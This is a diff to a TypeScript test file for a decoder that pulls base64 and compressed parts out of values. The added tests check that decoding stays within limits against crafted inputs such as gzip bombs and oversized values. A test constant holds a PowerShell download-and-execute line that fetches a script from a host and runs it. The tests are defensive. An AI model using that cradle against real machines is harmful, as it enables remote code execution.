@@ -1,6 +1,6 @@
 import { deflateRawSync, gzipSync } from 'node:zlib';
 import { describe, expect, it } from 'vitest';
-import { decodings, encodedParts } from '../src/explore/decode';
+import { DECODED_PARTS, decodings, encodedParts, SCANNED_LIMIT } from '../src/explore/decode';
 
 const base64 = (text: string, encoding: BufferEncoding = 'utf8') => Buffer.from(text, encoding).toString('base64');
 const SCRIPT = 'IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.5/a.ps1")';
@@ -66,5 +66,22 @@ describe('decoding', () => {
     expect((await decodings(`${one} and ${two} and ${one}`)).map((d) => d.text)).toEqual([
       'first message, long enough to count', 'second message, long enough to count',
     ]);
+  });
+});
+
+describe('a value crafted to exhaust the page', () => {
+  it('decodes at most a handful of parts', async () => {
+    const parts = Array.from({ length: 40 }, (_, i) => base64(`message number ${i} long enough to be base64`)).join(' ');
+    expect((await decodings(parts)).length).toBe(DECODED_PARTS);
+  });
+
+  it('stops unpacking once the value has unpacked a few MiB in all', async () => {
+    const bombs = Array.from({ length: 10 }, (_, i) => gzipSync(Buffer.from(`${i}`.padEnd(1024 * 1024, 'A'))).toString('base64')).join(' ');
+    expect((await decodings(bombs)).length).toBeLessThanOrEqual(4);
+  });
+
+  it('looks for encoded parts only near the start of a huge value', () => {
+    const tail = base64('found only past the scanned part of the value');
+    expect(encodedParts(`${'x '.repeat(SCANNED_LIMIT)}${tail}`)).toEqual([]);
   });
 });
